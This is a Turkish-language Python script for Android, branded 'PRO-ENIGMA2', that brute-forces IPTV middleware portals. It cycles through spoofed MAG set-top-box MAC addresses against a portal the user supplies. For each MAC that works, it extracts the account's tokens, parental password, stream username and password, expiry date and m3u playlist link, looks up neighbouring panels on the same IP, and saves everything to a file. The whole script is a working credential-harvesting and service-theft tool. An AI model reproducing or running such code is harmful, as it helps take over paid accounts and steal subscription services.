import requests, datetime
import json,random,sys, time
import androidhelper as sl4a
import subprocess
import pathlib
subprocess.run(["clear", ""])
ad = sl4a.Android()
oto=0
tur=0
Seri=""
say=0
yanpanel="hata" 
imzayan="" 
bul=0
hit=0
cpm=1
ses= requests.Session()

macSayisi=999999999999991# 1#deneme sayisı
feyzo=("""
\33[32m▰▰▰▰ᴘʏᴛʜᴏɴ PRO-ENIGMA2 ᴄᴏɴғɪɢ▰▰▰▰       \33[33m                 
╔═══════════════════════════════════════════════════════════════
║████  ████  ██ ░ ██ ░ ███████   ███   ███ ░    ███  ░ 
║██ ░░ ████  ██ ░ ██   ██ ░░     ████ ████ ░   ██ ██  ░ 
║████  ██ ██ ██ ░ ██ ░ ██  ███ ░ ██ █ █ ██ ░  ███████  ░
║██ ░░ ██  ████   ██ ░ ██   ██ ░ ██ ███ ██ ░ ██     ██ ░ 
║████░ ██  ████ ░ ██ ░ ███████ ░ ██     ██ ░ ██     ██ ░
╚═══════════════════════════════════════════════════════════════        
\33[32m▰▰▰▰ PRO-ENIGMA2 ᴄᴏɴғɪɢ ▰▰▰▰             \33[0m""")
print(feyzo) 
ozelmac=""
#################
panel = input("""
Örnek PanelAdı:Port = iptvturkiye.xyz:8080\n
	\33[1mʟüᴛғᴇɴ ᴘᴀɴᴇʟ ᴀᴅıɴı ʏᴀᴢıɴıᴢ.. ? \n\n
Panel:Port=\33[0m\33[31m\33[1m""")
uzmanmodu="kapalı"
if panel=="1":
    subprocess.run(["clear", ""]) 
    print(feyzo)
    uzmanmodu="açık"
    print("Uzman Modu açıldı, hata verdiğinde exit demeyecektir") 
    panel = input("""
Örnek PanelAdı:Port = iptvturkiye.xyz:8080\n
	\33[1mʟüᴛғᴇɴ ᴘᴀɴᴇʟ ᴀᴅıɴı ʏᴀᴢıɴıᴢ.. ? \n\n
Panel:Port=\33[0m\33[31m\33[1m""")
macturu=input("""
\33[1mMac kombinasyonu türünü seçin...?\33[0m
\33[33mArdışık artan mac için = \33[31m1
\33[33mRandom rasgele için   = \33[31m2

\33[0m\33[1mMac Kombinasyon Türü=\33[31m""")
if macturu=="":
	macturu="2"
#################
#print("\nTaranacak Panel:Port=\33[1m\33[31m" + panel +"\33[0m\n") 
#D4:CF:F9
#MacCombo="33:44:CF:4"
MacCombo="00:1A:79:"
#MacCombo="10:27:be:"
subprocess.run(["clear", ""])
print(feyzo) 
Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet\33[0m yada \33[1m\33[32mHayır\33[0m Yazınız!! =") 
if Macs=="1":
	macSayisi=1#int(input("Denecek mac sayısı =")) 
	ozelmac=input("Özel çalışan mac =")
if  Macs=="0":
	dmac=input("""
Default Mac Türü
	1= 00:1A:79:
	2= 10:27:BE:
	3= 33:44:CF
	4= Kendim Beliryeceğim...
	""")
	if dmac=="1":
		MacCombo="00:1A:79:"
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet\33[0m yada \33[1m\33[32mHayır\33[0m Yazınız!! =") 

	if dmac=="2":
		MacCombo="10:27:BE:"
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet\33[0m yada \33[1m\33[32mHayır\33[0m Yazınız!! =") 

	if dmac=="3":
		MacCombo="33:44:CF:"
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet\33[0m yada \33[1m\33[32mHayır\33[0m Yazınız!! =") 

	if dmac=="4":
		MacCombo=input("İlk üç maç türünü yazınız...")
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet\33[0m yada \33[1m\33[32mHayır\33[0m Yazınız!! =") 


if Macs[:1]=="e" or Macs[:1]=="E" :
    Seri=input("Örnek="+MacCombo+"\33[31m5\33[0m\nÖrnek="+MacCombo+"\33[31mFa\33[32m\nBir yada iki değer Yazınız!!!\33[0m\n\33[1m"+MacCombo+"\33[31m")
    Seri=Seri[:2]
    MacCombo=MacCombo+Seri[:2]
#################
#MacCombo=MacCombo
subprocess.run(["clear", ""])
print(feyzo) 
#print(len(feyzo)) 
mm=MacCombo.replace(':',"")
if panel=="" :
    exit() 
if len(mm)==6:
	turet=6
	MacCombo=MacCombo+":"
if len(mm)==7:
	turet=5
if len(mm)==8:
	turet=4
	MacCombo=MacCombo+":"
Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
acount_id="bbb"
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
sdd=0
DosyaA="/sdcard/" + panel.replace(":","_") +"@PROENIGMA2.txt"
def yaz(hits):
    dosya=open(DosyaA,'a+') 
    dosya.write(hits)
    dosya.close()
subprocess.run(["clear", ""])  
print(feyzo) 
for mag in range(0,macSayisi):
	oto=""
	macr=""
	tur=0
	if turet==5:
		nokta=1
	else:
		nokta=2
	for i in range(turet):
		if tur ==nokta:
			oto=oto+":"
			tur=0
			nokta=2
		oto=oto+random.choice('ABCDEF0123456789')
		tur = tur +1
		macr=oto
	if sdd==15:
		sdd=0
	if sd==15:
		sd=0
		sdd=sdd+1
	if ssss==15:
		ssss=0
		sd=sd+1
	if sss==15:
		sss=0
		ssss=ssss+1
	if ss==15:
		ss=0
		sss=sss+1
	if s==15:
		s=0
		ss=ss+1
	s=s+1
	seri1=a[sdd]
	seri2=a[sd]
	if not Seri=="":
		if len(Seri)==1:
			seri1=""#Seri
			
		if len(Seri)==2:
			seri1=""#Seri[1]
			seri2=""#Seri[2]
	#print(seri1)
	#print(seri2)		
	maca=(seri1+seri2+":"+a[ssss]+a[sss]+":"+a[ss]+a[s])
	if macturu =="1":
		mac=maca
	else:
		mac=macr
	mac=MacCombo+mac
		
		
	
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	if not ozelmac=="":
		mac=ozelmac
		
	#mac="00:1A:79:21:F1:7e"
	veri="feyzo"
	

	HEADERA={
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", 
"Pragma": "no-cache" ,
"Accept": "*/*" ,
"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FParis; adid=6A0D41537F9E7F08BEA0ADAA6FC90784",
"Agent": "Model: MAG254",
"Host": panel
	}
	
	try:
            veri="feyzo"
            url1="http://"+panel+"/server/load.php?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml"
            res = ses.get(url1, headers=HEADERA, timeout=15, verify=False)
            #if(res.status_code==200):
            veri=str(res.text)
	#except:pass
#	try:
            if veri.count("token")==0:
            	url1="http://"+panel+"/portal.php?type=stb&action=handshake&token="
            	res = ses.get(url1, headers=HEADERA, timeout=15, verify=False)
            	veri=str(res.text)
      #  except:pass
        #try:
            if veri.count("token")==0:
                url1= "http://"+panel+"/portal.php?type=stb&action=handshake&token=01B2E459B12816FE98AC1F15621D17B1&prehash=99b36771f80c30422e92a59c240294c840860b9a&mac="+mac+"&JsHttpRequest=1-xml"
                res = ses.get(url1, headers=HEADERA, timeout=15, verify=False)
               # if(res.status_code==200):
                veri=str(res.text)
      #  except:pass
      #  try:
            if veri.count("token")==0:
                url1= "http://"+panel+"/portal.php?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml"
                res = ses.get(url1, headers=HEADERA, timeout=15, verify=False)
                #if(res.status_code==200):
                veri=str(res.text)
       # except:pass
      #₺  try:
            if veri.count("token")==0:
                url1="http://"+panel+"/magLoad.php?deviceSn=&deviceMac="+mac+"&deviceType=MAG250&deviceVersion="
                res = ses.get(url1, headers=HEADERA, timeout=15, verify=False)
                veri=str(res.text)
                
	except:pass
	feyzo="feyzo"
	feyzo=veri[:1]
	
	token=veri.replace('{"js":{"token":"',"")
	token=token.replace('"}}',"")
    
	say=say+1
	total=str(say) 
	cpm=(time.time()-cpm)
	cpm=(round(60/cpm))
	print ("\33[96m🅟🅡🅞-🅔🅝🅘🅖🅜🅐2 🅟🅨   Total ➤"+total+"            \33[33m Hit ➤" + str(hit)+ "   \33[94m Cpm ➤" +str(cpm)+"  \n\33[0m" +mac+" \33[32m" +panel)
	cpm=time.time()

	
	HEADERd={
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", 
"Pragma": "no-cache" ,
"Accept": "*/*" ,
"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FParis; adid=6A0D41537F9E7F08BEA0ADAA6FC90784",
"Agent": "Model: MAG254",
"Host": panel,
"Authorization": "Bearer "+token,
	}
	try:
            url2="http://"+panel+"/portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml"
            url2="http://"+panel+"/server/load.php?type=stb&action=get_modules&JsHttpRequest=1-xml"
            res = ses.get(url2, headers=HEADERd, timeout=15, verify=False)
           # if(res.status_code==200):
            veri=str(res.text)
        #except:pass
	#try:
            #if veri.count("play_token")==0:
                #url2="http://"+panel+"/portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml"
              #  res = ses.get(url2, headers=HEADERd, timeout=15, verify=False)
                #if(res.status_code==200):
                    #veri=str(res.text)
       # except:pass        
       # try:
            #if veri.count("play_token")==0:
                #url2="http://"+panel+"/portal.php?type=stb&action=get_profile"
                #res = ses.get(url2, headers=HEADERd, timeout=15, verify=False)
                #if(res.status_code==200):
                #  ₺  veri=str(res.text)
       # except:pass
       # try:
            #if veri.count("play_token")==0:
               # url2="http://"+panel+"/server/load.php?type=stb&action=get_profile"
               # res = ses.get(url2, headers=HEADERd, timeout=15, verify=False)
              #  if(res.status_code==200):
                   # ₺₺veri=str(res.text)
	except:pass
        

	adult="b"
	try:
		
		adult=veri.split('parent_password":"')[1]
		adult=adult.split('"')[0]
		
		play_token=veri.split('play_token":"')[1]
		play_token=play_token.split('"')[0]
		
		acount_id=veri.split('name":"')[1]
		acount_id=acount_id.split('"')[0]
		
		stb_id=veri.split('id":"')[1]
		stb_id=stb_id.split('"')[0]
		
		ip=veri.split('ip":"')[1]
		ip=ip.split('"')[0]
	except:pass
	
	try:
	           url3="http://"+panel+"/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
	           res = ses.get(url3, headers=HEADERd, timeout=15, verify=False)
	           veri=str(res.text)
	           
	           
	           if (res.status_code==200):
	              url3="http://"+panel+"/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml&mac="+mac
	              res = ses.get(url3, headers=HEADERd, timeout=15, verify=False)
	              veri=str(res.text)
	except:pass
 #  try:
          #  if veri.count("Phone")==0:
             #   url3="http://"+panel+"/server/load.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
            #    res = ses.get(url3, headers=HEADERd, timeout=15, verify=False)
              #  if (res.status_code==200):
                #    veri=str(res.text)
	#except:pass
        
	feyzo="feyzo"
	feyzo=veri[:1]
	if not veri.count('phone')==0:#feyzo=="{" :
	   hit=hit+1
	   sound="/sdcard/kemik_sesi.mp3"
	   file = pathlib.Path(sound) 
	   if file.exists ():
	   	ad.mediaPlay(sound)
	   #print(veri)
	   #print("********")
	   try:
	   	trh=veri.split('phone":"')[1]
	   	trh=trh.replace('"}}',"")
	   except:
	   	trh="<EXP>"
	   url5="http://"+panel+"/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml"
	   kategori="hata"
	   res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   veri=str(res.text)
	   for i in veri.split('title":"'):
	   	kanal= (i.split('","')[0])
	   	kategori=kategori+kanal+"  ●📡● "
	   #print(kategori)
	   try:
	   	kategori=kategori.split("*")[1]
	   	kategori=kategori.replace("\/","/")
	   	#kategori =kategori.encode().decode('utf-8')
	   except:pass
	   	#kategori="hata"
	   
	   #print(kategori)
	   
	   url5="http://"+panel+"/portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml"
	   res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   veri=str(res.text)
	  
	   url5="http://"+panel+"/portal.php?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml"
	   token2="play_token" 
	   try:
	   	res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   	veri=str(res.text)
	   	#print(veri)
	   	token2=veri.split('cmd":"')[1]
	   	token2=token2.split('"')[0]
	   except:pass
	   real=panel
	   url5="http://"+real+"/portal.php?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/1823_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	   
	   userm="hata"
	   pasdm=""
	   try:
	   	res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   	veri=str(res.text)
	   	#print(veri+"?????????")
	   	veri=veri.replace('live\/', '') 
	   	real=veri.split('\/')[2]
	   	userm=veri.split('\/')[3]
	   	pasdm=veri.split(userm+'\/')[1]
	   	pasdm=pasdm.split('\/')[0]
	   #except:
	   	if userm=="hata":
	   		url5="http://"+real+"/portal.php?action=create_link&type=vod&cmd="+token2+"&JsHttpRequest=1-xml"
	   		res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   		#veri=str(res.text)
	   		#print(veri+"*//////////")
	   		real=veri.split('\/')[2]
	   		userm=veri.split('\/')[4]
	   		pasdm=veri.split('\/')[5]
	   		

	   	
	   except:pass	   		     


	   realm=real
	   try:
	   	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_live_streams"
	   	res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   	veri=str(res.text)
	   	kanalsayisi=str(veri.count("stream_id"))
	   
	   	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_vod_streams"
	   	res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   	veri=str(res.text)
	   	filmsayisi=str(veri.count("stream_id"))
	   #print(filmsayisi)
	   
	   
	   	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_series"
	   	res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   	veri=str(res.text)
	   	dizisayisi=str(veri.count("series_id"))
	   
	   
	   	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm
	   #AutoRedirect=FALSE
	   	res = ses.get(url5, headers=HEADERd, timeout=15, verify=False)
	   	veri=str(res.text)
	   #print(veri)
	   
	   
	   	acon=veri.split('active_cons":')[1]
	   	acon=acon.split(',')[0]
	   	acon=acon.replace('"',"")
	   
	   	mcon=veri.split('max_connections":')[1]
	   	mcon=mcon.split(',')[0]
	   	mcon=mcon.replace('"',"")
	   
	   	status=veri.split('status":')[1]
	   	status=status.split(',')[0]
	   	status=status.replace('"',"")
	   
	   	timezone=veri.split('timezone":"')[1]
	   	timezone=timezone.split('",')[0]
	   	timezone=timezone.replace("\/","/")
	   
	   	realm=veri.split('url":')[1]
	   	realm=realm.split(',')[0]
	   	realm=realm.replace('"',"")
	   
	   	portal=panel
	   	port=veri.split('port":')[1]
	   	port=port.split(',')[0]
	   	port=""+port.replace('"',"")
	   
	   	user=veri.split('username":')[1]
	   	user=user.split(',')[0]
	   	user=user.replace('"',"")
	   
	   	passw=veri.split('password":')[1]
	   	passw=passw.split(',')[0]
	   	passw=passw.replace('"',"")
	   
	   	bitis=veri.split('exp_date":')[1]
	   	bitis=bitis.split(',')[0]
	   	bitis=bitis.replace('"',"")
	   	if bitis=="null":
	   		bitis="Unlimited"
	   	else:
	   		bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
	   	bitis=bitis
	   	
	   	 
	   	pal=panel.split(':')[0]	
	   	url= "http://ipv4info.com/?act=check&ip="+pal
	   	res = ses.get(url, timeout=15, verify=False)
	   	veri=str(res.text)
	   	yan=""
	   	yanlar=veri
	   	yanpanel="hata"
	   	if veri.count("Site info ")>0:
	   		      for i in veri.split('Site info ('):
	   		          yan=yan+(i.split(')')[0])+" 🌎 "
	   		          yanpanel=(yan.split('(')[1])
	   	else:
	   		       yan1=veri.split('href="/ip-address')[1]
	   		       yan1=yan1.split('">')[0]
	   		       url="http://ipv4info.com/ip-address"+yan1
	   		       res = ses.get(url, timeout=15, verify=False)
	   		       veri=str(res.text)
	   		       if veri.count("Site info ")>0:
	   		             for i in veri.split('Site info ('):
	   		              yan=yan+(i.split(')')[0])+" 🌎 "
	   		              yanpanel=(yan.split('(')[1])
	   		
	   	#else:
	   	if not realm==panel:
	   		pal=realm.split(':')[0]
	   		url= "http://ipv4info.com/?act=check&ip="+pal
	   		res = ses.get(url, timeout=15, verify=False)
	   		veri=str(res.text)
	   		yan=""
	   		#yanlar=veri
	   		yanpanel1="hata"
	   		if veri.count("Site info ")>0:
	   		      for i in veri.split('Site info ('):
	   		          if yanpanel.count(i.split(')')[0])==0:
	   		          	yan=yan+(i.split(')')[0])+" 🌎 "
	   		          	yanpanel1=(yan.split('(')[1])
	   		else:
	   		      yan1=veri.split('href="/ip-address')[1]
	   		      yan1=yan1.split('">')[0]
	   		      url="http://ipv4info.com/ip-address"+yan1
	   		      res = ses.get(url, timeout=15, verify=False)
	   		      veri=str(res.text)
	   		      if veri.count("Site info ")>0:
	   		         for i in veri.split('Site info ('):
	   		          	  if yanpanel.count(i.split(')')[0])==0:
	   		          	   	yan=yan+(i.split(')')[0])+" 🌎 "
	   		          	   	yanpanel1=(yan.split('(')[1])
	   		
	   		if not yanpanel1=="hata" :
	   			yanpanel=yanpanel+yanpanel1
	   except:

	   	realm="pass"
	   mlink="http://"+ panel + "/get.php?username=" + userm + "&password=" + pasdm + "&type=m3u_plus"
	   imzaa=""
	   imzab=""
	   imza1=("""
u╔═╣ Watching for everyone ╠═╗
╠●🌐Panel➤http://"""+panel+"""
╠●🌍Real ➤ """+real+"""
╠●💎Mac➤ """+mac+"""
╠●📆Exp.➤ """+trh+"""
╠════╣ 🅟🅡🅞-🅔🅝🅘🅖🅜🅐2╠═""")
	   if not acount_id =="bbb":
	   	imzaa=("""
╠●👤Acn.Id ➤"""+acount_id+"""
╠●👤Stb Id ➤"""+stb_id+"""
╠●🔞A.Pass➤"""+adult+"""
╠●⚙️Ip➤"""+ip+"""
╠════╣🅟🅡🅞-🅔🅝🅘🅖🅜🅐2 Config╠═""")
	   #except:pass
	   imza2=""
	   if not realm=="pass":
	   	imza2=("""
╠●🌐 Host ➤ http://"""+portal+"""
╠●🌍 Real ➤ http://"""+realm+"""
╠●📡 Port ➤ """+port+"""
╠●👩‍ User ➤ """+user+"""
╠●🔑 Pass ➤ """+passw+"""
╠●📆 Exp. ➤ """+bitis+""" 
╠●👩 Act Con ➤ """+acon+"""
╠●👪 Max Con ➤ """+mcon+""" 
╠●🌐 Status ➤ """+status+"""
╠●⏰ TimeZone➤ """+timezone+"""
╠════╣
╠●🎬 Kanal Sayısı➤"""+kanalsayisi+"""
╠●🎬 Film Sayısı➤"""+filmsayisi+"""
╠●🎬 Dizi Sayısı➤"""+dizisayisi+"""
╠════╣ 🅟🅡🅞-🅔🅝🅘🅖🅜🅐2╠""")
	   imza3=("""
╠●🔗m3u_Url➤"""+mlink+"""
""")
	   if not yanpanel=="hata":
               imzayan=("""╠═╣ᴘʏᴛʜᴏɴ PRO-ENIGMA2 ᴄᴏɴғɪɢ╠
╠●🌐 Yan Paneller ➤ """+yanpanel+"""
""")
	   if not kategori=="hata":
	   	imzab=("""╠════╣ 🅟🅡🅞-🅔🅝🅘🅖🅜🅐2╠═
╠●Kategoriler➤"""+kategori+"""""")
	   imzas=("""
╚═Watching for everyone══╝""")
	   imza=imza1+imzaa+imza2+imza3+imzayan+imzab+imzas
	   
	   
	   yaz(imza+'\n'+'\n')
	   print('u' +imza)
	   

	

	

	
	
